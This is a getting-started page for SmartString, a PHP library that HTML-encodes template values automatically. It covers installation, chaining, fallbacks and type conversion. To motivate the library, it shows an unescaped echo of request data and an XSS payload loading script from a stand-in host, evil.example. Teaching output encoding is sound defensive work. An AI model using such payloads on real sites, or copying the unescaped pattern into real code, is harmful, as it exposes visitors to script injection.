<!-- Example output like &apos; includes a zero-width space (U+200B) after the "&" so PHPStorm's Markdown preview displays it correctly instead of decoding it. -->

# Getting Started

SmartString makes template output XSS-safe by default: values HTML-encode
themselves whenever they're printed. This page covers installation, your
first SmartString, the mental model behind the API, and the everyday basics:
chaining, fallbacks, type conversion, and defaults.

## Installation

Using CMS Builder or [ZenDB](https://github.com/interactivetools-com/ZenDB)?
SmartString is already installed, and every database value you touch is
already a SmartString; skip ahead to [The Mental Model](#the-mental-model).

```bash
composer require itools/smartstring
```

Requirements: PHP 8.1+ and `ext-mbstring`. Composer also installs
[SmartArray](https://github.com/interactivetools-com/SmartArray), the
companion library that handles arrays as collections of SmartStrings.

## Your First SmartString

Create a SmartString with `SmartString::new()`, then echo it. The output is
HTML-encoded automatically; you never call `htmlspecialchars()` yourself:

```php
use Itools\SmartString\SmartString;

$name = SmartString::new("Jean O'Brien");

echo "Hello, $name!";  // Hello, Jean O&​apos;Brien! (quote encoded automatically)
```

The single quote in "O'Brien" comes out as `&apos;`. That happens in every
string context: `echo`, `print`, concatenation, `(string)` casts, and
double-quoted interpolation.

## The Mental Model

A SmartString is an object, not a string. It stores your original value
untouched, and whenever PHP needs it as a string, the object converts itself
to its HTML-encoded value. That gives you two views of every value:

```php
$str = SmartString::new("It's easy!<hr>");

echo $str;           // It&​apos;s easy!&​lt;hr&​gt; (encoded, safe for HTML)
echo $str->value();  // It's easy!<hr> (the original value)
```

The rule that makes everything else predictable: **the raw value is for
logic (math, comparisons, MySQL); the encoded output is for HTML.** This
flips the old habit: instead of remembering to encode every output,
encoding happens on its own, and the one thing left to remember is
`value()` when your code needs the original. Forgetting even fails in your
favor: a stray `&apos;` you can see, not a security hole you can't.

```php
$price = SmartString::new(1234567.89);

if ($price->value() > 1000) {      // raw value for logic
    echo $price->numberFormat(2);  // encoded output for HTML: 1,234,567.89
}
```

The `value()` method is the escape hatch: it returns the original value in
its original type. An `int` goes in, an `int` comes back; same for `float`,
`bool`, and `null`.

## Why Auto-Encoding Matters

Every value you output in HTML needs `htmlspecialchars()`. Miss one, and an
attacker can run their own script in your page:

```php
// one forgotten htmlspecialchars() on a search page:
echo "Results for $_REQUEST[q]";
// ?q=<script src=//evil.example/steal.js></script>  now runs in every visitor's browser
```

Across hundreds of templates and thousands of echo statements, someone
eventually forgets one.

SmartString removes the problem by inverting the default: encoding is what
happens when you do nothing. You cannot produce unencoded output by accident;
you have to ask for it explicitly (see
[Encoding and HTML](encoding-and-html.md) for the explicit ways to ask).

## Chaining Methods

Transformation methods return a new SmartString, so calls chain left to
right and the result is still safe to echo:

```php
$article = SmartString::new("  <p>Hello <b>World</b></p> and more text here that keeps going  ");

echo $article->textOnly()->maxChars(20);  // Hello World and more...
```

Inside double-quoted strings, method calls need curly braces. This is a PHP
language requirement, not a SmartString rule:

```php
$date  = SmartString::new("2026-09-10 14:30:00");
$price = SmartString::new(1234567.89);

echo "Posted {$date->dateFormat('M jS, Y')}";  // Posted Sep 10th, 2026
echo "Total: {$price->numberFormat(2)}";       // Total: 1,234,567.89
```

## Fallbacks for Missing Values

SmartString calls a value **missing** when it is null or an empty string
`""`, and nothing else. Use `or()` to show a default when a value is
missing:

```php
$name = SmartString::new(null);
echo "Hello, {$name->or('Guest')}!";  // Hello, Guest!
```

Zero comes through `or()` unchanged because zero is not missing; a price of
zero (what your template shows as $0.00) is real data, not a missing value:

```php
$price = SmartString::new(0);
echo $price->or("N/A");  // 0
```

For values that must exist, like a record ID from the URL, `or404()` stops
the page with a 404 instead of substituting a default:

```php
$articleNum = (int)($_GET['num'] ?? 0);

$article = DB::selectOne('articles', ['num' => $articleNum]);
$article->num->or404("Article not found");

// past this line, $article is a real record
echo "<h1>$article->title</h1>";
```

A missing record comes back as an empty row, not null, so `$article->num` is
safe to call; the field simply reads as missing, which is what triggers the
guard.

The full family (`or()`, `ifNull()`, `ifZero()`, `or404()`, `orDie()`,
`orThrow()`, `orRedirect()`, and the true/false checks) is covered in
[Conditionals and Error Checking](conditionals-and-error-checking.md).

## Working with SmartArray and ZenDB

In practice, you rarely create SmartStrings one at a time. Database rows and
request data arrive as arrays, and
[SmartArray](https://github.com/interactivetools-com/SmartArray)'s
`SmartArrayHtml` class wraps a whole array so every value comes back as a
SmartString:

```php
use Itools\SmartArray\SmartArrayHtml;

$user = SmartArrayHtml::new([
    'name'      => "Jean O'Brien",
    'city'      => 'Vancouver',
    'lastLogin' => '2026-09-10 14:30:00',
]);

echo "Hello, $user->name from $user->city!";
// Hello, Jean O&​apos;Brien from Vancouver!

echo "Last login: {$user->lastLogin->dateFormat('F j, Y')}";
// Last login: September 10, 2026

$request = SmartArrayHtml::new($_REQUEST);   // request values work the same way
```

Field access interpolates without curly braces or quotes; the plain-array
version of that first echo would be
`"Hello, {$user['name']} from {$user['city']}!"`.

With [ZenDB](https://github.com/interactivetools-com/ZenDB) this happens
automatically: every query returns SmartArrays of SmartStrings, so you may
never call `SmartString::new()` at all:

```php
use Itools\ZenDB\DB;

$users = DB::select('users', ['status' => 'Active']);
foreach ($users as $user) {
    echo "$user->name from $user->city<br>\n";  // every value auto-encodes
}
```

## Converting to Plain PHP Types

The type-conversion methods return plain PHP values, so they end the chain.
Use them at boundaries: sessions, comparisons, and functions that expect a
specific type:

```php
$value = SmartString::new("123.45");

$value->int();     // 123
$value->float();   // 123.45
$value->bool();    // true
$value->string();  // "123.45" (the original string, NOT HTML-encoded)
$value->value();   // "123.45" (original value in its original type)
```

Note that `string()` returns the raw string, not the encoded one; it is
`value()` with a guaranteed string type. Null coerces the way PHP casts do:
`int()` returns `0`, `float()` returns `0.0`, `bool()` returns `false`, and
`string()` returns `""`. Use `value()` when you need to know a value was
actually null.

For code that receives a mix of SmartStrings and plain values,
`SmartString::getRawValue()` unwraps Smart* objects and passes everything
else through unchanged:

```php
SmartString::getRawValue(SmartString::new("hello"));  // "hello"
SmartString::getRawValue(42);                         // 42 (unchanged)
SmartString::getRawValue(null);                       // null (unchanged)
```

## Configuring Defaults

Three static properties control default formatting. Set them once at the top
of your script or in an init file and they apply everywhere:

```php
SmartString::$numberFormatDecimal   = '.';      // numberFormat() decimal separator
SmartString::$numberFormatThousands = ',';      // numberFormat() thousands separator
SmartString::$dateFormat            = 'Y-m-d';  // dateFormat() default format
```

The values above are the defaults. European locales typically swap the
number separators; see
[Text and Formatting](text-and-formatting.md#formatting-numbers---numberformat)
for how each setting is used.

## Debugging and Help

Use `print_r()` on any SmartString to see the stored value:

```php
$name = SmartString::new("Jean O'Brien");
print_r($name);

// Itools\SmartString\SmartString Object
// (
//     [README:private] => Call $obj->help() for more information and method examples.
//     [rawData:private] => "Jean O'Brien"
// )
```

Call `SmartString::help()` (or `$name->help()` on any instance) to print a
quick reference of every method with examples, grouped the same way as the
[Method Reference](method-reference.md).

## What SmartString Guarantees

1. **Every string context produces HTML-encoded output.** All of `echo`,
   `print`, interpolation, concatenation, and `(string)` casts encode.
2. **Your original value is preserved and accessible via `value()`.**
   Nothing is lost or altered by wrapping it.
3. **Type is maintained.** An `int` goes in and `value()` returns an `int`;
   same for `float`, `bool`, and `null`.
4. **Methods return new objects.** Chaining never modifies the original
   SmartString.
5. **Chains never throw on bad data.** Missing values pass through
   transformations, and failed operations (an invalid date, math on a
   non-numeric value) return null, so one `or()` at the end covers anything
   that went wrong anywhere in the chain.

## What SmartString Does Not Do

1. **It does not sanitize input.** It encodes output. Validate data before
   storage as you normally would.
2. **It does not validate data.** Use `filter_var()`, type declarations, or
   your own checks.
3. **It does not accept objects or resources.** Values are `string`, `int`,
   `float`, `bool`, or `null`; arrays belong in
   [SmartArray](https://github.com/interactivetools-com/SmartArray).
4. **It auto-encodes for HTML only.** URL and JSON contexts need their
   explicit methods, `urlEncode()` and `jsonEncode()`; see
   [Encoding and HTML](encoding-and-html.md).

---

[← Documentation Index](README.md) | [Next: Encoding and HTML →](encoding-and-html.md)
